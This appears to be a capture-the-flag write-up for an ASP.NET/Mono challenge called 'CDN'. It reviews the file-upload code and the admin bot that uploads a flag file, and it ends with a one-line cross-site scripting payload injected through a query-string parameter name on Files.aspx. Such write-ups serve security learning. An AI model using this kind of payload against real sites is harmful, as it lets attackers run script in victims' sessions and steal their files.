---
tags: 
references:
---
# CDN
Solves: 
Tags: #asp #xss
## Description
> **Diary Entry: February 10, 2080**
  
  Another day in the wasteland of enterprise software. The neon skyline flickers outside my window, but inside this concrete bunker of a cubicle, it's just me, an aging keyboard, and a .NET Framework project that refuses to die. I don't know how we got here. The world outside runs on quantum distributed neural meshes, but here I am, hammering away at legacy C# code in an IDE that barely runs on this salvaged hardware. Mono is the only thing keeping this fossil alive, and even that is held together with digital duct tape and the tears of developers long past. The system is ancient, predating even my grandparents. But the Corp won't let us move it. "Too much risk" they say. "Legacy compatibility" they insist. They don't see the warnings flashing in the logs like distress beacons in deep space. Reflection errors. Memory leaks. A garbage collector that might as well be a janitor sweeping an endless hallway of digital debris.
## Overview
Applications that lets upload files and report an url to a bot.
## Road to flag
The flag is in a file in the admin account:
```js
await page.goto(cdnUrl + '/Files.aspx', {
	waitUntil: 'networkidle0',
});
const elementHandle = await page.$("#ctl00_MainContent_FileUpload1");
await elementHandle.uploadFile('/tmp/flag.txt');
```
## Code review
### Web
- The app is made with `asp.net 4.5.2` and `mono`:
```dockerfile
FROM mono:latest
RUN apt-get update && apt-get install -y mono-xsp4 referenceassemblies-pcl
COPY app/ /var/www/app/
WORKDIR /var/www/app/
EXPOSE 9000
ENTRYPOINT [ "xsp4", "--nonstop", "--port=9000" ]
```
- packages in use:
```xml
<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="Microsoft.AspNet.FriendlyUrls" version="1.0.2" targetFramework="net452" />
  <package id="Microsoft.AspNet.FriendlyUrls.Core" version="1.0.2" targetFramework="net452" />
  <package id="Microsoft.AspNet.Identity.Core" version="2.2.4" targetFramework="net48" />
  <package id="Microsoft.AspNet.Identity.Owin" version="2.2.4" targetFramework="net48" />
  <package id="Microsoft.AspNet.Providers.Core" version="2.0.0" targetFramework="net452" />
  <package id="Microsoft.CodeDom.Providers.DotNetCompilerPlatform" version="4.1.0" targetFramework="net48" />
  <package id="Microsoft.Net.Compilers" version="4.2.0" targetFramework="net48" developmentDependency="true" />
  <package id="Microsoft.Owin" version="4.2.2" targetFramework="net48" />
  <package id="Microsoft.Owin.Host.SystemWeb" version="4.2.2" targetFramework="net48" />
  <package id="Microsoft.Owin.Security" version="4.2.2" targetFramework="net48" />
  <package id="Microsoft.Owin.Security.Cookies" version="4.2.2" targetFramework="net48" />
  <package id="Microsoft.Owin.Security.OAuth" version="4.2.2" targetFramework="net48" />
  <package id="Microsoft.Web.Infrastructure" version="2.0.0" targetFramework="net48" />
  <package id="Newtonsoft.Json" version="13.0.3" targetFramework="net48" />
  <package id="Owin" version="1.0" targetFramework="net452" />
  <package id="StructureMap" version="4.7.1" targetFramework="net48" />
  <package id="System.Reflection.Emit.Lightweight" version="4.7.0" targetFramework="net48" />
  <package id="WebActivatorEx" version="2.2.0" targetFramework="net48" />
  <package id="WebFormsMvp" version="1.4.5.0" targetFramework="net452" />
  <package id="WebFormsMvp.StructureMap" version="1.4.5.0" targetFramework="net452" />
</packages>
```

- Files are stored in a dictionary with the username as the key:
```c#
namespace CDN.Web
{
    public class FileData {
        public string FileName { get; set; }
        public string Data { get; set; }
    }
    [PresenterBinding(typeof(FilesPresenter))]
    public partial class Files : MvpPage<FilesViewModel>, IFilesView {
        public static readonly Dictionary<string, List<FileData>> _files = new Dictionary<string, List<FileData>>();
        protected void Page_Load(object sender, EventArgs e) {
            if (this.User.Identity.IsAuthenticated) {
                var username = this.User.Identity.Name;
                if (!_files.ContainsKey(username))
                    _files[username] = new List<FileData>();
                this.ListView1.DataSource = _files[username];
                if (_files[username].Count > 0)
                    this.ListView1.DataBind();
            }
            else {
                this.ListView1.DataSource = new List<FileData>();
            }
        }

        protected void UploadFileButton_Click(object sender, EventArgs e) {
            if (!this.User.Identity.IsAuthenticated) {
                this.ErrorMessage.Text = "Only signed in users can upload files.";
                return;
            }
            if (this.FileUpload1.HasFile) {
                var username = this.User.Identity.Name;
                var data = new FileData {
                    FileName = this.FileUpload1.FileName ?? "default-filename.bin",
                    Data = "data:application/octet-stream;base64," + Convert.ToBase64String(this.FileUpload1.FileBytes)
                };
                if (!_files.ContainsKey(username)) {
                    _files[username] = new List<FileData>();
                }
                _files[username].Add(data);
                this.ListView1.DataSource = _files[username];
                this.ListView1.DataBind();
                this.ErrorMessage.Text = "File upload successful.";
            }
            else {
                this.ErrorMessage.Text = "No file attached.";
            }
        }
    }
```
### Bot
- I can submit a relative path to the bot
```cs
//Contact.aspx.cs
protected void SendContactClick(object sender, EventArgs e) {
	if (Page.IsValid) {
			var relativePath = HttpUtility.UrlDecode(this.LinkText.Text);
			if (IsRelativePath(relativePath)) {
				this.ErrorMessage.Text = "";
				var client = new HttpClient();
				string botEndpoint = Environment.GetEnvironmentVariable("BOT_ENDPOINT");
				string cdnEndpoint = Environment.GetEnvironmentVariable("CDN_ENDPOINT");
				string url = $"http://{botEndpoint}/visit";
				var data = new {		url = $"http://{cdnEndpoint}{relativePath}"		};
				string jsonData = JsonConvert.SerializeObject(data);
				var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
				client.PostAsync(url, content).Wait();
			}
			else {
				this.ErrorMessage.Text = "Link is not relative. Admin not contacted.";
			}
	}
}
```

- The bot, before opening the sumbitted path, logs in and uploads the file containing the flag:
```js
const username = crypto.randomBytes(20).toString('hex');
const password = crypto.randomBytes(20).toString('hex');
let cdnUrl = 'http://' + process.env.CDN_ENDPOINT;
await page.goto(cdnUrl + '/Account/Register.aspx', {
		waitUntil: 'networkidle0',
});

console.log("Registering account");
await page.type('#ctl00_MainContent_UserName', username);
await page.type('#ctl00_MainContent_Password', password);
await page.type('#ctl00_MainContent_ConfirmPassword', password);

await Promise.all([
		page.click('#ctl00_MainContent_RegisterButton'),
		page.waitForNavigation({ waitUntil: "load" }),
]);

console.log("Logging into account");

await page.type('#ctl00_MainContent_UserName', username);
await page.type('#ctl00_MainContent_Password', password);

await Promise.all([
		page.click('#ctl00_MainContent_LoginButton'),
		page.waitForNavigation({ waitUntil: "load" }),
]);

console.log("Uploading flag")
await page.goto(cdnUrl + '/Files.aspx', {
		waitUntil: 'networkidle0',
});
const elementHandle = await page.$("#ctl00_MainContent_FileUpload1");
await elementHandle.uploadFile('/tmp/flag.txt');

```

## Exploitation
`/Files.aspx?<script>eval(atob(""))</script>=<img/src>`